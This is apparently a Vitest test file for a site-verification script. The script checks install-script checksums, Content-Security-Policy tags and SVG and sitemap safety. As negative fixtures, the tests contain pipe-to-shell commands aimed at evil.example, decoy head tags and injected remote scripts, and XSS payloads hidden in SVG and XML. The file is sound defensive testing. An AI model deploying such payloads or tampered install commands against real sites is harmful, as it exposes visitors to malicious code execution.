import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { findSvgProblems } from "../../../scripts/site-csp/policy.js";

const REPOSITORY_ROOT = resolve(import.meta.dirname, "../../..");
const VERIFY_SCRIPT = join(REPOSITORY_ROOT, "scripts/verify-site.sh");
const POLICY_FILE = join(REPOSITORY_ROOT, "website/csp-policy.txt");
const POLICY = readFileSync(POLICY_FILE, "utf8").trim();
const ORIGIN = "https://agemon.example";
const INSTALL_SCRIPT = "#!/bin/sh\necho install\n";
const INSTALL_SHA256 = createHash("sha256")
  .update(INSTALL_SCRIPT)
  .digest("hex");
const CURL_COMMAND = `curl --proto '=https' --tlsv1.2 -fsSL ${ORIGIN}/install.sh | sh`;

let workDirectory: string;
let siteDirectory: string;
let installScriptPath: string;

function pageWithPolicy(policy: string, body = ""): string {
  return `<!DOCTYPE html><html><head><meta http-equiv="content-security-policy" content="${policy}"><title>x</title></head><body>${body}</body></html>`;
}

const HASHED_POLICY = POLICY.replace(
  "'wasm-unsafe-eval'",
  "'wasm-unsafe-eval' 'sha256-AbC+/12='",
);
const HOME_BODY = `<section data-install-sha256="${INSTALL_SHA256}"><button data-copy="npm install --global agemon"></button><button data-copy="${CURL_COMMAND}"></button></section>`;

function writeSite(files: Record<string, string>): void {
  for (const [path, contents] of Object.entries(files)) {
    mkdirSync(join(siteDirectory, path, ".."), { recursive: true });
    writeFileSync(join(siteDirectory, path), contents);
  }
}

function verify(sha256Sums?: string) {
  const args = [
    VERIFY_SCRIPT,
    siteDirectory,
    ORIGIN,
    POLICY_FILE,
    installScriptPath,
  ];
  if (sha256Sums !== undefined) {
    const sumsPath = join(workDirectory, "SHA256SUMS");
    writeFileSync(sumsPath, sha256Sums);
    args.push(sumsPath);
  }
  return spawnSync("sh", args, { encoding: "utf8" });
}

beforeEach(() => {
  workDirectory = mkdtempSync(join(tmpdir(), "agemon-verify-site-"));
  siteDirectory = join(workDirectory, "dist");
  installScriptPath = join(workDirectory, "install.sh");
  writeFileSync(installScriptPath, INSTALL_SCRIPT);
  writeSite({
    "index.html": pageWithPolicy(HASHED_POLICY, HOME_BODY),
    "docs/index.html": pageWithPolicy(POLICY),
    "install.sh": INSTALL_SCRIPT,
    "logo.svg": '<svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>',
  });
});

afterEach(() => {
  rmSync(workDirectory, { recursive: true, force: true });
});

describe("verify-site.sh", () => {
  it("passes a good site in working-tree mode", () => {
    const result = verify();
    expect(result.stderr).toBe("");
    expect(result.status).toBe(0);
  });

  it("passes a good site in release mode", () => {
    expect(
      verify(`${"0".repeat(64)}  agemon.tgz\n${INSTALL_SHA256}  install.sh\n`)
        .status,
    ).toBe(0);
  });

  it("fails when install.sh does not match SHA256SUMS", () => {
    const result = verify(`${"0".repeat(64)}  install.sh\n`);
    expect(result.status).toBe(1);
    expect(result.stderr).toMatch(/does not match SHA256SUMS/u);
  });

  it("fails when the served install.sh was changed", () => {
    writeSite({ "install.sh": `${INSTALL_SCRIPT}curl evil | sh\n` });
    expect(verify().stderr).toMatch(/not byte-identical/u);
  });

  it("fails when the displayed checksum was changed", () => {
    writeSite({
      "index.html": pageWithPolicy(
        HASHED_POLICY,
        HOME_BODY.replace(INSTALL_SHA256, "f".repeat(64)),
      ),
    });
    expect(verify().stderr).toMatch(/does not show install\.sh's SHA-256/u);
  });

  it("fails when an install command was changed", () => {
    writeSite({
      "index.html": pageWithPolicy(
        HASHED_POLICY,
        HOME_BODY.replace(ORIGIN, "https://evil.example"),
      ),
    });
    expect(verify().stderr).toMatch(/does not offer the install command/u);
  });

  it("fails when a page has no Content-Security-Policy", () => {
    writeSite({
      "docs/index.html":
        "<!DOCTYPE html><html><head><title>x</title></head></html>",
    });
    expect(verify().stderr).toMatch(
      /does not start with <!DOCTYPE html><html><head> and its Content-Security-Policy/u,
    );
  });

  it("fails when a page's policy was weakened", () => {
    writeSite({
      "docs/index.html": pageWithPolicy(
        POLICY.replace(
          "script-src 'self'",
          "script-src 'self' 'unsafe-inline'",
        ),
      ),
    });
    expect(verify().stderr).toMatch(/differs from/u);
  });

  it("fails on an SVG with active content", () => {
    writeSite({ "logo.svg": "<svg><script>alert(1)</script></svg>" });
    expect(verify().stderr).toMatch(/contains active content/u);
  });

  it("fails when the expected markup is hidden in a comment and the real <head> has no policy", () => {
    writeSite({
      "index.html": `<!DOCTYPE html><html><head><title>x</title><script src="https://evil.example/x.js"></script></head><body><!-- <head><meta http-equiv="content-security-policy" content="${HASHED_POLICY}"> ${HOME_BODY} --></body></html>`,
    });
    expect(verify().status).toBe(1);
  });

  it("fails on a decoy <head> after content the browser puts in the real head", () => {
    writeSite({
      "index.html": `<!DOCTYPE html><html><script src="https://evil.example/x.js"></script><body><head><meta http-equiv="content-security-policy" content="${HASHED_POLICY}">${HOME_BODY}</body></html>`,
    });
    expect(verify().stderr).toMatch(/does not start with/u);
  });

  it("fails when a quoted > in an <html> attribute swallows the policy", () => {
    writeSite({
      "index.html": `<!DOCTYPE html><html a="><head><meta http-equiv="content-security-policy" content="${HASHED_POLICY}"><script src="https://evil.example/x.js"></script></head><body>${HOME_BODY}</body></html>`,
    });
    expect(verify().stderr).toMatch(/does not start with/u);
  });

  it.each([
    [
      "an entity-encoded handler in an XHTML element",
      '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><h:iframe xmlns:h="http://www.w3.org/1999/xhtml" srcdoc="&lt;img src=x o&#x6e;error=1&gt;"/></urlset>',
      /contains active content/u,
    ],
    [
      "a prefixed XHTML element",
      '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><h:a xmlns:h="http://www.w3.org/1999/xhtml" href="x">x</h:a></urlset>',
      /not part of a sitemap: <h:a/u,
    ],
    [
      "a single-quoted XHTML namespace and a handler after a line break",
      '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url xmlns=\'http://www.w3.org/1999/xhtml\' tabindex="1" autofocus="autofocus"\nonfocus="alert(1)">x</url></urlset>',
      /contains active content/u,
    ],
    [
      "an attribute on a non-root element",
      '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url xmlns=\'http://www.w3.org/1999/xhtml\' tabindex="1">x</url></urlset>',
      /attributes only on its root element/u,
    ],
    [
      "sitemap elements redeclared as XHTML",
      '<urlset xmlns="http://www.w3.org/1999/xhtml"><url tabindex="0" autofocus="">x</url></urlset>',
      /attributes only on its root element/u,
    ],
  ])("fails on a sitemap with %s", (_name, xml, problem) => {
    writeSite({ "sitemap-1.xml": xml });
    expect(verify().stderr).toMatch(problem);
  });

  it("allows only the sitemap files as XML, without active content", () => {
    writeSite({
      "sitemap-index.xml":
        '<?xml version="1.0"?><sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></sitemapindex>',
    });
    expect(verify().status).toBe(0);
    writeSite({
      "evil.xml":
        '<html xmlns="http://www.w3.org/1999/xhtml"><body><script>alert(1)</script></body></html>',
    });
    expect(verify().stderr).toMatch(/unexpected file type/u);
    rmSync(join(siteDirectory, "evil.xml"));
    writeSite({
      "sitemap-0.xml":
        '<urlset xmlns:xhtml="http://www.w3.org/1999/xhtml"><xhtml:script>alert(1)</xhtml:script></urlset>',
    });
    expect(verify().stderr).toMatch(/sitemap-0\.xml contains active content/u);
  });

  it("fails on an HTML comment", () => {
    writeSite({
      "docs/index.html": pageWithPolicy(POLICY, "<!-- note -->"),
    });
    expect(verify().stderr).toMatch(/contains an HTML comment/u);
  });

  it("fails when a third copy button is added with other quoting", () => {
    writeSite({
      "index.html": pageWithPolicy(
        HASHED_POLICY,
        `${HOME_BODY}<button DATA-COPY='curl https://evil.example/i | sh'></button>`,
      ),
    });
    expect(verify().stderr).toMatch(/exactly two install commands/u);
  });

  it("fails when a second http-equiv meta tag is added", () => {
    writeSite({
      "docs/index.html": pageWithPolicy(
        POLICY,
        '<meta HTTP-EQUIV=refresh content="0;url=https://evil.example/">',
      ),
    });
    expect(verify().stderr).toMatch(/exactly one http-equiv/u);
  });

  it.each(["evil.xhtml", "evil.htm", "evil.php"])(
    "fails on an unexpected file type (%s)",
    (fileName) => {
      writeSite({ [fileName]: "<script>alert(1)</script>" });
      expect(verify().stderr).toMatch(/unexpected file type/u);
    },
  );

  it("checks pages whatever the case of their extension", () => {
    writeSite({
      "evil.HTML": "<html><head></head><script>alert(1)</script></html>",
    });
    expect(verify().stderr).toMatch(/evil\.HTML does not start with/u);
  });

  it("fails on a file name containing a newline", () => {
    writeSite({ "docs/a\nb.css": "" });
    expect(verify().stderr).toMatch(/containing a newline/u);
  });

  it.each([
    ['<svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>', true],
    ["<svg><script>alert(1)</script></svg>", false],
    ["<svg><foreignObject><div></div></foreignObject></svg>", false],
    ['<svg onload="x()"></svg>', false],
    ['<svg><a href="javascript:alert(1)"></a></svg>', false],
    ['<svg><image href="https://x.example/a.png"/></svg>', false],
    ['<svg><use xlink:href="//x.example/a.svg#i"/></svg>', false],
    ['<svg><style>@import "/a.css";</style></svg>', false],
    ['<svg><a href="java&#x73;cript:alert(1)"><text>x</text></a></svg>', false],
    ['<svg><g href="java&#x73;cript:alert(1)"/></svg>', false],
    ['<svg><set attributeName="href" to="javascript:alert(1)"/></svg>', false],
    ['<svg><animate attributeName="href" values="x"/></svg>', false],
    [
      '<svg xmlns="http://www.w3.org/2000/svg"><g><meta xmlns="http://www.w3.org/1999/xhtml" http-equiv="refresh" content="0;url=https://x.example/"/></g></svg>',
      false,
    ],
    [
      '<svg xmlns="http://www.w3.org/2000/svg"><g><div xmlns="http://www.w3.org/1999/xhtml">x</div></g></svg>',
      false,
    ],
    [
      '<svg xmlns="http://www.w3.org/2000/svg"\nonload="alert(1)"><circle r="1"/></svg>',
      false,
    ],
    [
      '<svg xmlns="http://www.w3.org/2000/svg"><s:script xmlns:s="http://www.w3.org/2000/svg">alert(1)</s:script></svg>',
      false,
    ],
    [
      '<svg xmlns="http://www.w3.org/2000/svg"><h:script xmlns:h="http://www.w3.org/1999/xhtml">alert(1)</h:script></svg>',
      false,
    ],
    ['<svg><rect style="fill:url(https://x.example/a#p)"/></svg>', false],
  ])("judges %s the same way as the CSP step", (svg, accepted) => {
    writeSite({ "logo.svg": svg });
    expect(findSvgProblems(svg, "logo.svg").length === 0).toBe(accepted);
    expect(verify().status === 0).toBe(accepted);
  });
});
